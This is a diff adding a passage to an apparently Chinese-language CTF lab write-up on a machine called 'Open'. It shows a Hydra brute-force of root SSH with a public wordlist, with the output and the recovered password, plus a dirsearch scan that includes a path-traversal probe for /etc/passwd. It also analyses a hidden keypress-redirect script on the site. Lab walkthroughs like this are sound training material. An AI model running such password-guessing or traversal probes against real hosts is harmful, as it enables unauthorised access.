@@ -110,3 +110,89 @@ Target: http://10.216.75.72/
 [00:02:25] 400 -   304B - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 好像也没扫到啥有用的，莫非要去爆破了吗？暂时没思路。。。
+很抓马的事情。。。。。。。
+就在我想破脑袋都不知道怎么做疯狂找apache历史漏洞的时候：
+```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.216.75.72 -t 4
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-06 01:58:07
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.216.75.72:22/
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
+[STATUS] 68.00 tries/min, 204 tries in 00:03h, 14344195 to do in 3515:45h, 4 active
+
+[STATUS] 67.86 tries/min, 475 tries in 00:07h, 14343924 to do in 3523:05h, 4 active
+[22][ssh] host: 10.216.75.72   login: root   password: zacefron
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-06 02:08:49
+```
+`[22][ssh] host: 10.216.75.72   login: root   password: zacefron`
+这告诉我们啥也做不出来的时候，还是可以试试被爆破的。
+直接爆破出来root密码了，还能说什么呢。虽然知道这肯定不是预期解，但是我实在想不出来了，就登上root去看了一下`/var/www/html`，发现居然是我字典里没有`secret.php`（看来需要换字典了）
+```bash
+root@Open:~# ls /var/www/html
+index.php  secret.php  sl.php
+```
+那就还是把这个加到字典里好好做一下吧。
+# 端口扫描（重新开始）
+```bash
+PS D:\webtool\Dirsearch> python dirsearch.py -u 10.216.75.72 -w dicc2.txt
+D:\webtool\Dirsearch\lib\core\installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 13136
+
+Target: http://10.216.75.72/
+
+[02:16:09] Scanning:
+[02:16:09] 403 -    2KB - /secret.php
+[02:16:09] 400 -   304B - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[02:16:12] 403 -   277B - /.php
+[02:16:26] 200 -    2KB - /index.php
+[02:16:26] 200 -    2KB - /index.php/login/
+[02:16:36] 403 -   277B - /server-status
+[02:16:36] 403 -   277B - /server-status/
+```
+# 渗透测试
+## secret.php
+虽然没有什么有用的文件，但是我们注意到同样是`403`，`/secret.php`文件的403页面的大小要小很多，我们去web看一下。
+![](file-20260506022715811.png)
+![](file-20260506022737023.png)
+很明显`/secret.php`的403页面不一样，不是标准的apache-403。
+我们去看看源码，发现最下方有隐藏的脚本（打印了很多空行）
+```js
+ <script>
+        // 使用最稳健的非混淆结构，但通过 atob 隐藏关键字符串
+        (function() {
+            var _s = "";
+            document.addEventListener('keydown', function(e) {
+                // 忽略非字符键（如 Shift）
+                if (e.key.length > 1) return;
+                
+                _s += e.key.toLowerCase();
+                
+                // 检查是否包含 "open" 的 Base64 编码 (b3Blbg==)
+                if (_s.indexOf(atob('b3Blbg==')) !== -1) {
+                    // 跳转到 sl.php 的 Base64 编码 (c2wucGhw)
+                    // 修改点：'ZW50cmFuY2UucGhw' -> 'c2wucGhw'
+                    window.location.href = atob('c2wucGhw');
+                }
+                
+                // 防止缓冲区过长
+                if (_s.length > 20) _s = _s.substring(10);
+            });
+        })();
+    </script>
+```
+脚本效果：
+1. **记录按键**：监听 `keydown` 事件，收集用户的按键（小写字母）。
+2. **触发条件**：当按下的字母序列包含 **"open"**（`atob('b3Blbg==')` 解码得到 `"open"`）时，网页跳转到 `atob('c2wucGhw')` 解码后的路径 —— **`sl.php`**。
+3. **防缓冲区过长**：只保留最近20个字符，避免序列太长。
+我们直接键盘按一下`open`，跳转到了`http://10.216.75.72/sl.php`
+## sl.php
